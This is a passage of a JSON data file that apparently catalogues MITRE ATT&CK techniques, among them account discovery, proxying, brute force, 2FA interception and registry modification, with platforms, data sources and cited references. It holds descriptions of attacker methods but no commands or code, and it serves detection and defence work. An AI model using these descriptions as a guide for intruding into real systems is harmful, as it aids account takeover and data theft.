      },
      {
        "source_name": "Windows Commands JPCERT",
        "url": "http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html",
        "description": "Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
    "platform": "linux|macos|windows|office-365|azure-ad|aws|gcp|azure|saas",
    "tid": "T1087",
    "technique": "Account Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|azure-activity-logs|office-365-account-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1087.001",
      "T1087.002",
      "T1087.003",
      "T1087.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/575.html",
        "description": "none",
        "external_id": "CAPEC-575"
      }
    ]
  },
  {
    "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
    "platform": "linux|macos|windows|network",
    "tid": "T1090",
    "technique": "Proxy",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1090.001",
      "T1090.002",
      "T1090.003",
      "T1090.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including <a href=\"https://attack.mitre.org/software/S0040\">HTRAN</a>, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro APT Attack Tools",
        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4",
    "platform": "windows",
    "tid": "T1091",
    "technique": "Replication Through Removable Media",
    "tactic": "lateral-movement",
    "datasources": "data-loss-prevention|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media’s firmware itself.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4",
    "platform": "windows",
    "tid": "T1091",
    "technique": "Replication Through Removable Media",
    "tactic": "initial-access",
    "datasources": "data-loss-prevention|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media’s firmware itself.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef",
    "platform": "linux|macos|windows",
    "tid": "T1092",
    "technique": "Communication Through Removable Media",
    "tactic": "command-and-control",
    "datasources": "data-loss-prevention|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by <a href=\"https://attack.mitre.org/techniques/T1091\">Replication Through Removable Media</a>. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
    "platform": "windows|linux|macos|network",
    "tid": "T1095",
    "technique": "Non-Application Layer Protocol",
    "tactic": "command-and-control",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-intrusion-detection-system|network-protocol-analysis|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).<!-- raw HTML omitted --><!-- raw HTML omitted -->ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)<!-- raw HTML omitted --> Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia OSI",
        "url": "http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29",
        "description": "Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ICMP",
        "url": "http://support.microsoft.com/KB/170292",
        "description": "Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
    "platform": "windows|office-365|azure|gcp|azure-ad|aws|linux|macos",
    "tid": "T1098",
    "technique": "Account Manipulation",
    "tactic": "persistence",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1098.001",
      "T1098.002",
      "T1098.003",
      "T1098.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft User Modified Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Event 4670",
        "url": "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670",
        "description": "Franklin Smith, R. (n.d.). Windows Security Log Event ID 4670. Retrieved November 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "InsiderThreat ChangeNTLM July 2017",
        "url": "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
        "description": "Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mimikatz Issue 92 June 2017",
        "url": "https://github.com/gentilkiwi/mimikatz/issues/92",
        "description": "Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
    "platform": "linux|macos|windows",
    "tid": "T1102",
    "technique": "Web Service",
    "tactic": "command-and-control",
    "datasources": "host-network-interface|netflow-enclave-netflow|network-protocol-analysis|packet-capture|ssl-tls-inspection",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1102.001",
      "T1102.002",
      "T1102.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.<!-- raw HTML omitted --><!-- raw HTML omitted -->Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91",
    "platform": "linux|macos|windows",
    "tid": "T1104",
    "technique": "Multi-Stage Channels",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-protocol-analysis|packet-capture|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.<!-- raw HTML omitted --><!-- raw HTML omitted -->Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.<!-- raw HTML omitted --><!-- raw HTML omitted -->The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or <a href=\"https://attack.mitre.org/techniques/T1008\">Fallback Channels</a> in case the original first-stage communication path is discovered and blocked.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
    "platform": "linux|macos|windows",
    "tid": "T1105",
    "technique": "Ingress Tool Transfer",
    "tactic": "command-and-control",
    "datasources": "file-monitoring|netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
    "platform": "windows|macos|linux",
    "tid": "T1106",
    "technique": "Native API",
    "tactic": "execution",
    "datasources": "api-monitoring|loaded-dlls|process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <!-- raw HTML omitted -->CreateProcess()<!-- raw HTML omitted --> or GNU <!-- raw HTML omitted -->fork()<!-- raw HTML omitted --> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)<!-- raw HTML omitted --><!-- raw HTML omitted -->Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these native API functions as a means of executing behaviors. Similar to <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a>, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.</p>\n",
    "technique_references": [
      {
        "source_name": "NT API Windows",
        "url": "https://undocumented.ntinternals.net/",
        "description": "The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel API",
        "url": "https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html",
        "description": "Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Fork",
        "url": "https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html",
        "description": "Free Software Foundation, Inc.. (2020, June 18). Creating a Process. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Win32",
        "url": "https://docs.microsoft.com/en-us/windows/win32/api/",
        "description": "Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "LIBC",
        "url": "https://man7.org/linux/man-pages//man7/libc.7.html",
        "description": "Kerrisk, M. (2016, December 12). libc(7) — Linux manual page. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GLIBC",
        "url": "https://www.gnu.org/software/libc/",
        "description": "glibc developer community. (2020, February 1). The GNU C Library (glibc). Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NET",
        "url": "https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework",
        "description": "Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Core Services",
        "url": "https://developer.apple.com/documentation/coreservices",
        "description": "Apple. (n.d.). Core Services. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "MACOS Cocoa",
        "url": "https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1",
        "description": "Apple. (2015, September 16). Cocoa Application Layer. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "macOS Foundation",
        "url": "https://developer.apple.com/documentation/foundation",
        "description": "Apple. (n.d.). Foundation. Retrieved July 1, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
    "platform": "linux|macos|windows|office-365|azure-ad|saas|gcp|aws|azure",
    "tid": "T1110",
    "technique": "Brute Force",
    "tactic": "credential-access",
    "datasources": "authentication-logs|office-365-account-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1110.001",
      "T1110.002",
      "T1110.003",
      "T1110.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/49.html",
        "description": "none",
        "external_id": "CAPEC-49"
      }
    ]
  },
  {
    "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
    "platform": "linux|windows|macos",
    "tid": "T1111",
    "technique": "Two-Factor Authentication Interception",
    "tactic": "credential-access",
    "datasources": "api-monitoring|kernel-drivers|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. <!-- raw HTML omitted --><!-- raw HTML omitted -->If a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user’s personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)<!-- raw HTML omitted --><!-- raw HTML omitted -->Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M Trends 2011",
        "url": "https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf",
        "description": "Mandiant. (2011, January 27). Mandiant M-Trends 2011. Retrieved January 10, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GCN RSA June 2011",
        "url": "https://gcn.com/articles/2011/06/07/rsa-confirms-tokens-used-to-hack-lockheed.aspx",
        "description": "Jackson, William. (2011, June 7). RSA confirms its tokens used in Lockheed hack. Retrieved September 24, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Operation Emmental",
        "url": "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf",
        "description": "Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
    "platform": "windows",
    "tid": "T1112",
    "technique": "Modify Registry",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility <a href=\"https://attack.mitre.org/software/S0075\">Reg</a> may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.<!-- raw HTML omitted --><!-- raw HTML omitted -->Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via <a href=\"https://attack.mitre.org/software/S0075\">Reg</a> or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> are required, along with access to the remote system’s <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a> for RPC communication.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/203.html",
        "description": "none",
        "external_id": "CAPEC-203"
      },
      {
        "source_name": "Microsoft Reg",
        "url": "https://technet.microsoft.com/en-us/library/cc732643.aspx",
        "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Reghide NOV 2006",
        "url": "https://docs.microsoft.com/sysinternals/downloads/reghide",
        "description": "Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro POWELIKS AUG 2014",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/",
        "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Hiding Reg Jul 2017",
        "url": "https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353",
        "description": "Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Remote",
        "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx",
        "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4657 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft RegDelNull July 2016",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull",
        "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
    "platform": "linux|macos|windows",
    "tid": "T1113",
    "technique": "Screen Capture",
    "tactic": "collection",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <!-- raw HTML omitted -->CopyFromScreen<!-- raw HTML omitted -->, <!-- raw HTML omitted -->xwd<!-- raw HTML omitted -->, or <!-- raw HTML omitted -->screencapture<!-- raw HTML omitted -->.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/648.html",
        "description": "none",
        "external_id": "CAPEC-648"
      },
      {
        "source_name": "CopyFromScreen .NET",
        "url": "https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8",
        "description": "Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved March 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
    "platform": "windows|office-365",
    "tid": "T1114",
    "technique": "Email Collection",
    "tactic": "collection",
    "datasources": "authentication-logs|email-gateway|file-monitoring|mail-server|office-365-trace-logs|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1114.001",
      "T1114.002",
      "T1114.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Tim McMichael Exchange Mail Forwarding 2",
        "url": "https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/",
        "description": "McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f",
    "platform": "linux|windows|macos",
    "tid": "T1115",
    "technique": "Clipboard Data",
    "tactic": "collection",
    "datasources": "api-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
